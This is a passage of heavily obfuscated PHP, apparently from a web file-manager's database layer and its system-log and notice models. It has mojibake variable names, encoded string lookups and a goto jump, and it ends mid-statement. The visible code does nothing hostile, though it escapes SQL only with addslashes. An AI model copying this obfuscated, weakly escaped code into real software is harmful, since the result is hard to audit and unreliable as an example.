$ù’ÕêŞü[39] => isset($İ©á¸Ò[$ù’ÕêŞü[95]]) ? strtolower($İ©á¸Ò[$ù’ÕêŞü[95]]) == $ù’ÕêŞü[41] : (isset($İ©á¸Ò[$ù’ÕêŞü[57]]) ? $İ©á¸Ò[$ù’ÕêŞü[57]] : !1), $ù’ÕêŞü[42] => isset($İ©á¸Ò[$ù’ÕêŞü[1065]]) ? strtolower($İ©á¸Ò[$ù’ÕêŞü[1065]]) == $ù’ÕêŞü[44] : (isset($İ©á¸Ò[$ù’ÕêŞü[95]]) ? $İ©á¸Ò[$ù’ÕêŞü[95]] : !1)); } } return $¯ıË÷¿‹; } public function getTables($œˆÒ«ªÊ = '') { $¤ç×ªˆø =& $_SERVER[±Ö‰ô½¯]; if (think_config($¤ç×ªˆø[1066])) { $•¿òÌîû = str_replace($¤ç×ªˆø[1067], $œˆÒ«ªÊ, think_config($¤ç×ªˆø[1066])); } else { switch ($this->dbType) { case $¤ç×ªˆø[1034]: case $¤ç×ªˆø[1036]: $•¿òÌîû = $¤ç×ªˆø[1068]; break; case $¤ç×ªˆø[1033]: case $¤ç×ªˆø[1051]: $•¿òÌîû = $¤ç×ªˆø[1069]; break; case $¤ç×ªˆø[1060]: $•¿òÌîû = $¤ç×ªˆø[1070]; break; case $¤ç×ªˆø[1035]: think_exception(think_lang($¤ç×ªˆø[1071]) . $¤ç×ªˆø[1072]); break; case $¤ç×ªˆø[1052]: $•¿òÌîû = $¤ç×ªˆø[45] . $¤ç×ªˆø[46] . $¤ç×ªˆø[47]; break; case $¤ç×ªˆø[1063]: default: if (!empty($œˆÒ«ªÊ)) { $•¿òÌîû = $¤ç×ªˆø[1012] . $œˆÒ«ªÊ . $¤ç×ªˆø[1013]; } else { $•¿òÌîû = $¤ç×ªˆø[1014]; } } } $Î¯Å¾ç‘ = $this->query($•¿òÌîû); $È–èŞ = array(); foreach ($Î¯Å¾ç‘ as $ë¹ƒ“Œ“ => $€Êº•‹‹) { $È–èŞ[$ë¹ƒ“Œ“] = current($€Êº•‹‹); } return $È–èŞ; } protected function parseLimit($Ë‚ÕÅù) { $šã²˜î¯ =& $_SERVER[±Ö‰ô½¯]; $íÏÑå­µ = $šã²˜î¯[12]; if (!empty($Ë‚ÕÅù)) { switch ($this->dbType) { case $šã²˜î¯[1060]: case $šã²˜î¯[1052]: $Ë‚ÕÅù = explode($šã²˜î¯[50], $Ë‚ÕÅù); if (count($Ë‚ÕÅù) > 1) { $íÏÑå­µ .= $šã²˜î¯[51] . $Ë‚ÕÅù[1] . $šã²˜î¯[52] . $Ë‚ÕÅù[0] . $šã²˜î¯[53]; } else { $íÏÑå­µ .= $šã²˜î¯[51] . $Ë‚ÕÅù[0] . $šã²˜î¯[53]; } break; case $šã²˜î¯[1033]: case $šã²˜î¯[1051]: break; case $šã²˜î¯[1035]: break; case $šã²˜î¯[1034]: case $šã²˜î¯[1036]: break; case $šã²˜î¯[1063]: default: $íÏÑå­µ .= $šã²˜î¯[51] . $Ë‚ÕÅù . $šã²˜î¯[53]; } } return $íÏÑå­µ; } public function parseKey(&$ğ“»—á‹, $Ò¬²Êáï = true) { $ä‡¿ìÃ¼ =& $_SERVER[±Ö‰ô½¯]; if ($Ò¬²Êáï) { $ğ“»—á‹ = $this->parseKeyCheck($ğ“»—á‹); } if ($this->dbType == $ä‡¿ìÃ¼[1063]) { if ($ğ“»—á‹ != $ä‡¿ìÃ¼[222] && !preg_match($ä‡¿ìÃ¼[1027], $ğ“»—á‹)) { $ğ“»—á‹ = $ä‡¿ìÃ¼[473] . trim($ğ“»—á‹, $ä‡¿ìÃ¼[473]) . $ä‡¿ìÃ¼[473]; } return $ğ“»—á‹; } else { return parent::parseKey($ğ“»—á‹, $Ò¬²Êáï); } } public function close() { $this->_linkID = null; } public function error() { $øÊÜÀ¼º =& $_SERVER[±Ö‰ô½¯]; if ($this->PDOStatement) { $±ùğÀú× = $this->PDOStatement->errorInfo(); $this->error = $±ùğÀú×[1] . $øÊÜÀ¼º[4] . $±ùğÀú×[2]; } else { $this->error = $øÊÜÀ¼º[12]; } if ($øÊÜÀ¼º[12] != $this->queryStr) { $this->error .= LNG($øÊÜÀ¼º[48]) . $this->queryStr; } think_trace($this->error, $øÊÜÀ¼º[12], $øÊÜÀ¼º[49]); return $this->error; } public function escapeString($•éô¦ûÎ) { $³ÖÅî¿¯ =& $_SERVER[±Ö‰ô½¯]; switch ($this->dbType) { case $³ÖÅî¿¯[1060]: case $³ÖÅî¿¯[1033]: case $³ÖÅî¿¯[1051]: case $³ÖÅî¿¯[1063]: return addslashes($•éô¦ûÎ); case $³ÖÅî¿¯[1035]: case $³ÖÅî¿¯[1052]: case $³ÖÅî¿¯[1034]: case $³ÖÅî¿¯[1036]: return str_ireplace($³ÖÅî¿¯[58], $³ÖÅî¿¯[59], $•éô¦ûÎ); } } protected function parseValue($éÔª¨) { $Ö½ûüòé =& $_SERVER[±Ö‰ô½¯]; if (is_string($éÔª¨)) { $ğñ²Œ² = strpos($éÔª¨, $Ö½ûüòé[4]) === 0 && in_array($éÔª¨, array_keys($this->bind)); $éÔª¨ = $ğñ²Œ² ? $this->escapeString($éÔª¨) : $Ö½ûüòé[1073] . $this->escapeString($éÔª¨) . $Ö½ûüòé[1073]; } elseif (isset($éÔª¨[0]) && is_string($éÔª¨[0]) && strtolower($éÔª¨[0]) == $Ö½ûüòé[374]) { $éÔª¨ = $this->escapeString($éÔª¨[1]); } elseif (is_array($éÔª¨)) { $éÔª¨ = array_map(array($this, $Ö½ûüòé[1074]), $éÔª¨); } elseif (is_bool($éÔª¨)) { $éÔª¨ = $éÔª¨ ? $Ö½ûüòé[91] : $Ö½ûüòé[230]; } elseif (is_null($éÔª¨)) { $éÔª¨ = $Ö½ûüòé[104]; } return $éÔª¨; } public function getLastInsertId() { $‹¯ªü©ò =& $_SERVER[±Ö‰ô½¯]; switch ($this->dbType) { case $‹¯ªü©ò[1060]: case $‹¯ªü©ò[1052]: case $‹¯ªü©ò[1033]: case $‹¯ªü©ò[1051]: case $‹¯ªü©ò[1035]: case $‹¯ªü©ò[1063]: return $this->_linkID->lastInsertId(); case $‹¯ªü©ò[1034]: case $‹¯ªü©ò[1036]: $Ë‘ÔüËæ = $this->table; $ìœ¤ØòÈ = $this->query("\x53\x45\114\105\103\124\x20{$Ë‘ÔüËæ}\x2e\x63\165\162\x72\x76\141\x6c\40\143\x75\162\162\x76\141\x6c\x20\106\x52\117\x4d\x20\x64\x75\141\154"); return $ìœ¤ØòÈ ? $ìœ¤ØòÈ[0][$‹¯ªü©ò[1075]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ˆ¬ãÀë¼) { $¾ôªÎá =& $_SERVER[±Ö‰ô½¯]; if (!CacheLock::fileLock($¾ôªÎá[13])) { return !1; } $†–åÍòâ = parent::query($ˆ¬ãÀë¼); CacheLock::fileUnLock($¾ôªÎá[13]); return $†–åÍòâ; } public function execute($ñé°ÌÎÖ) { $§ü«×øÉ =& $_SERVER[±Ö‰ô½¯]; if (!CacheLock::fileLock($§ü«×øÉ[13])) { return !1; } $Ã¸İø˜ = parent::execute($ñé°ÌÎÖ); CacheLock::fileUnLock($§ü«×øÉ[13]); return $Ã¸İø˜; } } class DbSqlite3 extends DbSqlite3Base { public function query($ğ„¤»€›) { $ÍÅ©Ğä =& $_SERVER[±Ö‰ô½¯]; if (!CacheLock::fileLock($ÍÅ©Ğä[13])) { return !1; } $‹½Ô´Ô” = parent::query($ğ„¤»€›); CacheLock::fileUnLock($ÍÅ©Ğä[13]); return $‹½Ô´Ô”; } public function execute($Ç†õ›¾õ) { $õ³¢–¿Ä =& $_SERVER[±Ö‰ô½¯]; if (!CacheLock::fileLock($õ³¢–¿Ä[13])) { return !1; } $úŠŸ–õ» = parent::execute($Ç†õ›¾õ); CacheLock::fileUnLock($õ³¢–¿Ä[13]); return $úŠŸ–õ»; } } goto aÉÕÊíÓ±Î; C­µêˆÅŞ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\x5f\154\x6f\x67"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\124\x69\x6d\x65", "\164\x69\155\145", "\151\156\163\145\162\x74", "\146\x75\x6e\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $§ÔòÍ =& $_SERVER[±Ö‰ô½¯]; return array($§ÔòÍ[2507] => LNG($§ÔòÍ[2508]), $§ÔòÍ[2509] => LNG($§ÔòÍ[2510]), $§ÔòÍ[2082] => LNG($§ÔòÍ[2511]), $§ÔòÍ[2512] => LNG($§ÔòÍ[2513]), $§ÔòÍ[2514] => LNG($§ÔòÍ[2515]), $§ÔòÍ[2516] => LNG($§ÔòÍ[2517]), $§ÔòÍ[2518] => LNG($§ÔòÍ[2519]), $§ÔòÍ[2110] => LNG($§ÔòÍ[2519]), $§ÔòÍ[2111] => LNG($§ÔòÍ[2520]), $§ÔòÍ[2521] => LNG($§ÔòÍ[2522]), $§ÔòÍ[2523] => LNG($§ÔòÍ[2524]), $§ÔòÍ[2525] => LNG($§ÔòÍ[2526]), $§ÔòÍ[2527] => LNG($§ÔòÍ[2528]), $§ÔòÍ[2108] => LNG($§ÔòÍ[2529]), $§ÔòÍ[2530] => LNG($§ÔòÍ[2531]), $§ÔòÍ[2115] => LNG($§ÔòÍ[2532]), $§ÔòÍ[2533] => LNG($§ÔòÍ[2534]), $§ÔòÍ[2535] => LNG($§ÔòÍ[2536]), $§ÔòÍ[2537] => LNG($§ÔòÍ[2538]), $§ÔòÍ[2539] => LNG($§ÔòÍ[2540]), $§ÔòÍ[2117] => LNG($§ÔòÍ[2541]), $§ÔòÍ[2118] => LNG($§ÔòÍ[2542]), $§ÔòÍ[2543] => LNG($§ÔòÍ[2544]), $§ÔòÍ[2545] => LNG($§ÔòÍ[2546]), $§ÔòÍ[2547] => LNG($§ÔòÍ[2548]), $§ÔòÍ[2113] => LNG($§ÔòÍ[2549]), $§ÔòÍ[2550] => LNG($§ÔòÍ[2551]), $§ÔòÍ[2112] => LNG($§ÔòÍ[2552]), $§ÔòÍ[2553] => LNG($§ÔòÍ[2553]), $§ÔòÍ[2554] => LNG($§ÔòÍ[2555]), $§ÔòÍ[2556] => LNG($§ÔòÍ[2553]), $§ÔòÍ[2557] => LNG($§ÔòÍ[2558]), $§ÔòÍ[2559] => LNG($§ÔòÍ[2560]), $§ÔòÍ[2561] => LNG($§ÔòÍ[2560]), $§ÔòÍ[2562] => LNG($§ÔòÍ[2563]), $§ÔòÍ[2564] => LNG($§ÔòÍ[2564]), $§ÔòÍ[2565] => LNG($§ÔòÍ[2086]), $§ÔòÍ[2566] => LNG($§ÔòÍ[2567]), $§ÔòÍ[2568] => LNG($§ÔòÍ[2569]), $§ÔòÍ[2570] => LNG($§ÔòÍ[2571]), $§ÔòÍ[2572] => LNG($§ÔòÍ[2573]), $§ÔòÍ[2574] => LNG($§ÔòÍ[2575]), $§ÔòÍ[2576] => LNG($§ÔòÍ[2576]), $§ÔòÍ[2577] => LNG($§ÔòÍ[2578]), $§ÔòÍ[2579] => LNG($§ÔòÍ[2580]), $§ÔòÍ[2581] => LNG($§ÔòÍ[2582]), $§ÔòÍ[2583] => LNG($§ÔòÍ[2584]), $§ÔòÍ[2585] => LNG($§ÔòÍ[2586]), $§ÔòÍ[2587] => LNG($§ÔòÍ[2588]), $§ÔòÍ[212] => LNG($§ÔòÍ[212]), $§ÔòÍ[213] => LNG($§ÔòÍ[2589]), $§ÔòÍ[2590] => LNG($§ÔòÍ[2590])); } private function typeFile() { $¤«ÀŒå =& $_SERVER[±Ö‰ô½¯]; $¤Ëï‚ôª = array($¤«ÀŒå[2115] => array($¤«ÀŒå[2116]), $¤«ÀŒå[2525] => array($¤«ÀŒå[2591]), $¤«ÀŒå[2527] => array($¤«ÀŒå[2592]), $¤«ÀŒå[2108] => array($¤«ÀŒå[2109], $¤«ÀŒå[2593]), $¤«ÀŒå[2535] => array(), $¤«ÀŒå[2537] => array(), $¤«ÀŒå[2539] => array(), $¤«ÀŒå[2117] => array($¤«ÀŒå[2119]), $¤«ÀŒå[2118] => array($¤«ÀŒå[2119]), $¤«ÀŒå[2543] => array($¤«ÀŒå[2594]), $¤«ÀŒå[2545] => array($¤«ÀŒå[2594]), $¤«ÀŒå[2547] => array($¤«ÀŒå[2595]), $¤«ÀŒå[2533] => array($¤«ÀŒå[2596]), $¤«ÀŒå[2113] => array($¤«ÀŒå[2597]), $¤«ÀŒå[2550] => array($¤«ÀŒå[2598]), $¤«ÀŒå[2112] => array($¤«ÀŒå[2114])); return $¤Ëï‚ôª; } private function typeAll() { $şçÀÀšœ =& $_SERVER[±Ö‰ô½¯]; $şá“±—’ = $this->typeList; $Š¨üµ¸ = array_filter($this->typeFile()); foreach ($Š¨üµ¸ as $ÒàŸ¥ê => $¡¾›“¦) { $şá“±—’[$¡¾›“¦[0]] = $şá“±—’[$ÒàŸ¥ê]; } $şá“±—’[$şçÀÀšœ[2119]] = LNG($şçÀÀšœ[2599]); $şá“±—’[$şçÀÀšœ[2594]] = LNG($şçÀÀšœ[2600]); return $şá“±—’; } public function addLog($É‚‡ °‘, $Öø™¸Âû = array()) { $´ÔÃˆ¨ =& $_SERVER[±Ö‰ô½¯]; if (!isset($this->typeList[$É‚‡ °‘])) { return; } $›ü¥³»ñ = Session::get($´ÔÃˆ¨[2273]); if (!$›ü¥³»ñ) { $›ü¥³»ñ = _get($Öø™¸Âû, $´ÔÃˆ¨[1542], 0); } if ($É‚‡ °‘ == $´ÔÃˆ¨[2566] && is_array($Öø™¸Âû[$´ÔÃˆ¨[2601]]) && !$Öø™¸Âû[$´ÔÃˆ¨[2601]]) { return; } $ÂŸ¬†Ãæ = get_client_ip(); if (!$Öø™¸Âû || strlen(json_encode($Öø™¸Âû)) >= 1024 * 64) { if ($Öø™¸Âû && is_array($Öø™¸Âû)) { $Öø™¸Âû = array_intersect_key($Öø™¸Âû, array_flip($´ÔÃˆ¨[484], $´ÔÃˆ¨[32])); $Öø™¸Âû[$´ÔÃˆ¨[1558]] = $ÂŸ¬†Ãæ; } else { $Öø™¸Âû = array($´ÔÃˆ¨[1558] => $ÂŸ¬†Ãæ); } } else { if (is_array($Öø™¸Âû)) { $Öø™¸Âû[$´ÔÃˆ¨[1558]] = $ÂŸ¬†Ãæ; } else { $Öø™¸Âû = array($´ÔÃˆ¨[1339] => $Öø™¸Âû, $´ÔÃˆ¨[1558] => $ÂŸ¬†Ãæ); } } $Öø™¸Âû[$´ÔÃˆ¨[2602]] = ACTION; $Öø™¸Âû = array($´ÔÃˆ¨[1920] => Session::sign(), $´ÔÃˆ¨[1921] => intval($›ü¥³»ñ), $´ÔÃˆ¨[33] => $É‚‡ °‘, $´ÔÃˆ¨[1923] => json_encode($Öø™¸Âû)); Hook::trigger($´ÔÃˆ¨[2603], $Öø™¸Âû); return parent::add($Öø™¸Âû); } public function remove($œ©¼àŞè) { $this->where(array($_SERVER[±Ö‰ô½¯][505] => $œ©¼àŞè))->delete(); } private function _makeOrder($Óİ¨±–ú = '') { $Å¼ÑÊù¡ =& $_SERVER[±Ö‰ô½¯]; $ÒÎ£¨Ô› = $Å¼ÑÊù¡[233]; $£’îÎû¡ = array($Å¼ÑÊù¡[534] => $Å¼ÑÊù¡[535], $Å¼ÑÊù¡[536] => $Å¼ÑÊù¡[537]); $ã­Ô­Ù× = Input::get($Å¼ÑÊù¡[542], $Å¼ÑÊù¡[7], $Å¼ÑÊù¡[2311], array($Å¼ÑÊù¡[2229], $Å¼ÑÊù¡[536])); $ã­Ô­Ù× = $£’îÎû¡[$ã­Ô­Ù×]; $Óİ¨±–ú = $Óİ¨±–ú . "{$ÒÎ£¨Ô›}\x20{$ã­Ô­Ù×}"; return $this->order($Óİ¨±–ú); } public function get($ÏÖÀÙğ‹ = '') { $Š†¦â¡« =& $_SERVER[±Ö‰ô½¯]; if (!$ÏÖÀÙğ‹) { show_json(array()); } $¤³…Ğ Î = array(); if ($ÏÖÀÙğ‹[$Š†¦â¡«[1542]]) { $¤³…Ğ Î[$Š†¦â¡«[1542]] = $ÏÖÀÙğ‹[$Š†¦â¡«[1542]]; } if (isset($ÏÖÀÙğ‹[$Š†¦â¡«[858]])) { $¦ÍóÕßˆ = $ÏÖÀÙğ‹[$Š†¦â¡«[858]]; $Œ‰ãåæÓ = isset($ÏÖÀÙğ‹[$Š†¦â¡«[859]]) ? $ÏÖÀÙğ‹[$Š†¦â¡«[859]] : time(); $¤³…Ğ Î[$Š†¦â¡«[233]] = array($Š†¦â¡«[410], array($¦ÍóÕßˆ, $Œ‰ãåæÓ)); } if ($ÏÖÀÙğ‹[$Š†¦â¡«[33]]) { $½‘›ú€ß = explode($Š†¦â¡«[50], $ÏÖÀÙğ‹[$Š†¦â¡«[33]]); $—æ¢”ŞÜ = $this->typeFile(); $‚¿í¥›Ğ = array(); foreach ($½‘›ú€ß as $²‘Ùæ®ƒ) { $‚¿í¥›Ğ[] = $²‘Ùæ®ƒ; if (isset($—æ¢”ŞÜ[$²‘Ùæ®ƒ])) { $‚¿í¥›Ğ = array_merge($‚¿í¥›Ğ, $—æ¢”ŞÜ[$²‘Ùæ®ƒ]); } } $‚¿í¥›Ğ = array_unique($‚¿í¥›Ğ); if ($‚¿í¥›Ğ) { $¤³…Ğ Î[$Š†¦â¡«[33]] = array($Š†¦â¡«[7], $‚¿í¥›Ğ); } } else { $¤³…Ğ Î[$Š†¦â¡«[33]] = array($Š†¦â¡«[2604], $Š†¦â¡«[2605]); } if (!empty($ÏÖÀÙğ‹[$Š†¦â¡«[1558]])) { $¤³…Ğ Î[$Š†¦â¡«[537]] = array($Š†¦â¡«[471], "\45{$ÏÖÀÙğ‹[$Š†¦â¡«[1558]]}\x25"); } $²Æšø€‡ = $this->_makeOrder()->where($¤³…Ğ Î)->selectPage(); if (empty($²Æšø€‡[$Š†¦â¡«[447]])) { show_json(array(), !0, $²Æšø€‡[$Š†¦â¡«[444]]); } $²Æšø€‡[$Š†¦â¡«[447]] = $this->logList($²Æšø€‡[$Š†¦â¡«[447]]); return $²Æšø€‡; } private function ipAddress(&$Ú²½‰…) { $“ÀšÌîÂ =& $_SERVER[±Ö‰ô½¯]; if (!empty($Ú²½‰…[$“ÀšÌîÂ[1558]])) { $õÊ¶ŞĞš = IpLocation::get($Ú²½‰…[$“ÀšÌîÂ[1558]]); } else { $õÊ¶ŞĞš = LNG($“ÀšÌîÂ[2606]); } $Ú²½‰…[$“ÀšÌîÂ[2607]] = $õÊ¶ŞĞš; } private function descZipDownload($Úìšë‘, &$ê´¦ı¦») { $©•´öŠ÷ =& $_SERVER[±Ö‰ô½¯]; if (!isset($Úìšë‘[$©•´öŠ÷[1565]])) { return; } $æ˜º©ó½ = json_decode($Úìšë‘[$©•´öŠ÷[1565]], !0); foreach ($æ˜º©ó½ as $¦Ê»üÅó) { try { $ü¹„¦ = IO::infoFullSimple($¦Ê»üÅó[$©•´öŠ÷[87]]); } catch (Exception $œÆ‡Ç“÷) { continue; } $Úìšë‘[$©•´öŠ÷[87]] = $¦Ê»üÅó[$©•´öŠ÷[87]]; $ê´¦ı¦»[] = $Úìšë‘[$©•´öŠ÷[193]] = $ü¹„¦[$©•´öŠ÷[193]]; $ê´¦ı¦»[] = $Úìšë‘[$©•´öŠ÷[2371]] = $ü¹„¦[$©•´öŠ÷[192]]; break; } return $Úìšë‘; } private function getSourceList(&$¢ÎÚµıå) { $çıº²åá =& $_SERVER[±Ö‰ô½¯]; $Ş—ÖÈÂ÷ = array(); foreach ($¢ÎÚµıå as $½Çæ«ï => $‘©Ù½Ó³) { $é”Çé¼ = json_decode($‘©Ù½Ó³[$çıº²åá[537]], !0); if ($‘©Ù½Ó³[$çıº²åá[33]] == $çıº²åá[2111]) { $é”Çé¼ = $this->descZipDownload($é”Çé¼, $Ş—ÖÈÂ÷); $¢ÎÚµıå[$½Çæ«ï][$çıº²åá[537]] = json_encode($é”Çé¼); continue; } if (strpos($‘©Ù½Ó³[$çıº²åá[33]], $çıº²åá[2373]) !== 0) { if (!isset($é”Çé¼[$çıº²åá[87]]) || strpos($‘©Ù½Ó³[$çıº²åá[33]], $çıº²åá[2608]) !== 0) { continue; } try { $ó±İ’ã± = IO::infoFullSimple($é”Çé¼[$çıº²åá[87]]); } catch (Exception $ÁÉ¨õÓİ) { continue; } $Ş—ÖÈÂ÷[] = $é”Çé¼[$çıº²åá[193]] = $ó±İ’ã±[$çıº²åá[193]]; $Ş—ÖÈÂ÷[] = $é”Çé¼[$çıº²åá[2371]] = $ó±İ’ã±[$çıº²åá[192]]; $¢ÎÚµıå[$½Çæ«ï][$çıº²åá[537]] = json_encode($é”Çé¼); continue; } $Ş—ÖÈÂ÷[] = $é”Çé¼[$çıº²åá[193]]; $Ş—ÖÈÂ÷[] = $é”Çé¼[$çıº²åá[2371]]; if ($é”Çé¼[$çıº²åá[33]] == $çıº²åá[640]) { $Ş—ÖÈÂ÷[] = $é”Çé¼[$çıº²åá[537]][$çıº²åá[1292]]; $Ş—ÖÈÂ÷[] = $é”Çé¼[$çıº²åá[537]][$çıº²åá[1293]]; } if ($é”Çé¼[$çıº²åá[33]] == $çıº²åá[2381]) { $Ş—ÖÈÂ÷[] = $é”Çé¼[$çıº²åá[537]][$çıº²åá[193]]; } } if (!$Ş—ÖÈÂ÷) { return array(); } return Model($çıº²åá[930])->sourceListInfo($Ş—ÖÈÂ÷, !0); } private function logList($ˆïµÕó˜) { $ŸÌû­Íñ =& $_SERVER[±Ö‰ô½¯]; $ø„¹Ù«¥ = array_to_keyvalue($ˆïµÕó˜, $ŸÌû­Íñ[12], $ŸÌû­Íñ[1542]); $…Ò„¸ì = Model($ŸÌû­Íñ[614])->userListInfo(array_unique($ø„¹Ù«¥)); $Úæ“ãõî = $this->getSourceList($ˆïµÕó˜); $©ß³°ØŸ = $this->typeAll(); $ĞÂ¦ƒÒ = array(); $ÆÈ÷•·³ = array(); foreach ($ˆïµÕó˜ as $ñééÛÎ => $ç½††©) { $»é”œ· = $ç½††©[$ŸÌû­Íñ[33]]; $Üˆ¹öœœ = isset($…Ò„¸ì[$ç½††©[$ŸÌû­Íñ[1542]]]) ? $…Ò„¸ì[$ç½††©[$ŸÌû­Íñ[1542]]] : !1; $ÍÏİ£ë­ = strpos($»é”œ·, $ŸÌû­Íñ[2609]) === 0 ? LNG($ŸÌû­Íñ[2610]) : LNG($ŸÌû­Íñ[2606]); $ç½††©[$ŸÌû­Íñ[32]] = isset($Üˆ¹öœœ[$ŸÌû­Íñ[32]]) ? $Üˆ¹öœœ[$ŸÌû­Íñ[32]] : LNG($ŸÌû­Íñ[2606]); $ç½††©[$ŸÌû­Íñ[2432]] = isset($Üˆ¹öœœ[$ŸÌû­Íñ[2432]]) ? $Üˆ¹öœœ[$ŸÌû­Íñ[2432]] : $ŸÌû­Íñ[12]; $ç½††©[$ŸÌû­Íñ[1815]] = isset($©ß³°ØŸ[$»é”œ·]) ? $©ß³°ØŸ[$»é”œ·] : $ÍÏİ£ë­; $ç½††©[$ŸÌû­Íñ[2310]] = $Üˆ¹öœœ; $úâÀ·–¿ = json_decode($ç½††©[$ŸÌû­Íñ[537]], !0); $ç½††©[$ŸÌû­Íñ[1558]] = isset($úâÀ·–¿[$ŸÌû­Íñ[1558]]) ? $úâÀ·–¿[$ŸÌû­Íñ[1558]] : $ŸÌû­Íñ[12]; $ç½††©[$ŸÌû­Íñ[2607]] = IpLocation::get($ç½††©[$ŸÌû­Íñ[1558]]); if (strpos($»é”œ·, $ŸÌû­Íñ[2373]) === 0 || isset($úâÀ·–¿[$ŸÌû­Íñ[2371]])) { $úâÀ·–¿[$ŸÌû­Íñ[90]] = $Úæ“ãõî[$úâÀ·–¿[$ŸÌû­Íñ[193]]]; $úâÀ·–¿[$ŸÌû­Íñ[2386]] = $Úæ“ãõî[$úâÀ·–¿[$ŸÌû­Íñ[2371]]]; if ($úâÀ·–¿[$ŸÌû­Íñ[33]] == $ŸÌû­Íñ[640]) { $úâÀ·–¿[$ŸÌû­Íñ[537]][$ŸÌû­Íñ[1292]] = $Úæ“ãõî[$úâÀ·–¿[$ŸÌû­Íñ[537]][$ŸÌû­Íñ[1292]]]; $úâÀ·–¿[$ŸÌû­Íñ[537]][$ŸÌû­Íñ[1293]] = $Úæ“ãõî[$úâÀ·–¿[$ŸÌû­Íñ[537]][$ŸÌû­Íñ[1293]]]; } if ($úâÀ·–¿[$ŸÌû­Íñ[33]] == $ŸÌû­Íñ[2381]) { $úâÀ·–¿[$ŸÌû­Íñ[537]][$ŸÌû­Íñ[193]] = $Úæ“ãõî[$úâÀ·–¿[$ŸÌû­Íñ[537]][$ŸÌû­Íñ[193]]]; } if ($úâÀ·–¿[$ŸÌû­Íñ[33]] == $ŸÌû­Íñ[1280]) { $úâÀ·–¿[$ŸÌû­Íñ[2386]] = $úâÀ·–¿[$ŸÌû­Íñ[90]]; $úâÀ·–¿[$ŸÌû­Íñ[2371]] = $úâÀ·–¿[$ŸÌû­Íñ[2386]][$ŸÌû­Íñ[193]]; $úâÀ·–¿[$ŸÌû­Íñ[90]] = !1; $úâÀ·–¿[$ŸÌû­Íñ[193]] = $ŸÌû­Íñ[12]; } $¤¿š¾ÈÉ = array($ŸÌû­Íñ[1280], $ŸÌû­Íñ[2369]); if (!in_array($úâÀ·–¿[$ŸÌû­Íñ[33]], $¤¿š¾ÈÉ)) { if ($úâÀ·–¿[$ŸÌû­Íñ[90]] && $úâÀ·–¿[$ŸÌû­Íñ[90]][$ŸÌû­Íñ[190]] == $ŸÌû­Íñ[191]) { $ÆÈ÷•·³[] = $ç½††©[$ŸÌû­Íñ[484]]; unset($ˆïµÕó˜[$ñééÛÎ]); continue; } if ($úâÀ·–¿[$ŸÌû­Íñ[2386]] && $úâÀ·–¿[$ŸÌû­Íñ[2386]][$ŸÌû­Íñ[190]] == $ŸÌû­Íñ[191]) { $ÆÈ÷•·³[] = $ç½††©[$ŸÌû­Íñ[484]]; unset($ˆïµÕó˜[$ñééÛÎ]); continue; } } } $ç½††©[$ŸÌû­Íñ[537]] = $úâÀ·–¿; unset($ç½††©[$ŸÌû­Íñ[2611]]); $ĞÂ¦ƒÒ[] = $ç½††©; } $this->clearSystemPathLog($ÆÈ÷•·³); return $ĞÂ¦ƒÒ; } private function clearSystemPathLog($—Œóˆï) { $€Á¤–‰ =& $_SERVER[±Ö‰ô½¯]; if (count($—Œóˆï) == 0) { return; } $‰ì”äµ¾ = array($€Á¤–‰[484] => array($€Á¤–‰[7], array_unique($—Œóˆï))); $this->where($‰ì”äµ¾)->delete(); } public function deviceList($è¸Ö¯ŸÊ, $Ä†„‹­í = 0) { $îıùâáå =& $_SERVER[±Ö‰ô½¯]; $ş¸¢ÉøÊ = array($îıùâáå[1542] => $è¸Ö¯ŸÊ, $îıùâáå[233] => array($îıùâáå[1130], $Ä†„‹­í), $îıùâáå[33] => $îıùâáå[2082]); $ô‘Ê¨†æ = array(); $Ëšğ½ = $this->field($îıùâáå[2612])->where($ş¸¢ÉøÊ)->order($îıùâáå[2384])->limit(50)->select(); foreach ($Ëšğ½ as $—Ì„ˆÈø => $¹°ïìß—) { if ($—Ì„ˆÈø > 0 && abs($¹°ïìß—[$îıùâáå[233]] - $Ëšğ½[$—Ì„ˆÈø - 1][$îıùâáå[233]]) < 5) { continue; } $†®ìÀÊâ = json_decode($¹°ïìß—[$îıùâáå[537]], !0); $¹°ïìß—[$îıùâáå[1558]] = isset($†®ìÀÊâ[$îıùâáå[1558]]) ? $†®ìÀÊâ[$îıùâáå[1558]] : $îıùâáå[12]; unset($†®ìÀÊâ[$îıùâáå[1558]]); $õ·ê‹‘ = $this->deviceType($†®ìÀÊâ[$îıùâáå[2374]]); if (isset($ô‘Ê¨†æ[$õ·ê‹‘])) { continue; } $¹°ïìß—[$îıùâáå[2607]] = IpLocation::get($¹°ïìß—[$îıùâáå[1558]]); $¹°ïìß—[$îıùâáå[537]] = $†®ìÀÊâ; $ô‘Ê¨†æ[$õ·ê‹‘] = $¹°ïìß—; } return array_values($ô‘Ê¨†æ); } public function deviceType($‰É’öœé) { return $‰É’öœé; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\156\157\x74\151\143\145\114\151\163\164"; public $field = array("\x6e\141\155\145", "\143\x6f\x6e\164\145\156\164", "\x61\x75\164\150", "\155\157\144\x65", "\164\151\155\x65", "\164\171\160\x65", "\154\x65\166\x65\154", "\x65\156\x61\x62\154\x65", "\x73\x6f\x72\x74"); public function listData($²©íÈ±¼ = false, $·á˜©ÓÆ = "\x73\x6f\162\x74", $ßÑÅ¹ôÀ = false) { return parent::listData($²©íÈ±¼, $·á˜©ÓÆ, $ßÑÅ¹ôÀ); } public function add($—·¹ §) { $óå°”öú =& $_SERVER[±Ö‰ô½¯]; $Í’ŸÓ™‰ = time(); if ($—·¹ §[$óå°”öú[16]] == $óå°”öú[2613]) { $Í’ŸÓ™‰ = strtotime($—·¹ §[$óå°”öú[206]]); } $—·¹ §[$óå°”öú[206]] = $Í’ŸÓ™‰; return parent::insert($—·¹ §); } public function update($â‹»–Ò…, $İ‚ª…±) { $¦á¢¾ø¼ =& $_SERVER[±Ö‰ô½¯]; $Š¥·§Òæ = $this->listData($â‹»–Ò…); if (!$Š¥·§Òæ) { return !1; } $Ìö’öÓ = time(); if ($İ‚ª…±[$¦á¢¾ø¼[16]] == $¦á¢¾ø¼[2613]) { $Ìö’öÓ = strtotime($İ‚ª…±[$¦á¢¾ø¼[206]]); } $İ‚ª…±[$¦á¢¾ø¼[206]] = $Ìö’öÓ; return 